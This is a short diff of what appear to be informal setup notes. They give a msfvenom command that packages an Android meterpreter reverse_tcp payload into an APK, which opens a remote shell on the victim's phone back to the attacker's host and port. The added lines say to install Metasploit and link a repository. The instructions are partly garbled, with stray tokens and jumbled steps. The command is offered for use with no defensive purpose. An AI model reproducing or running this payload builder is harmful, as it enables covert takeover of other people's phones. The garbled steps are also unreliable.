@@ -16,3 +16,6 @@ install msfconsole and msfvenom
 run this on terminal msfvenom -p android/meterpreter/reverse_tcp -LHOST <ifconfig on otherterminal(ip)> -LPORT <no ssh(port number)> >> <filename>.apk execute<venom><upload><save><run> <traceback>.md
   
   venom install in package
+  
+  install metasploit-framework now
+  link ==>> https://github.com/trustedsec/metasploit-framework.git <frame-work:;>
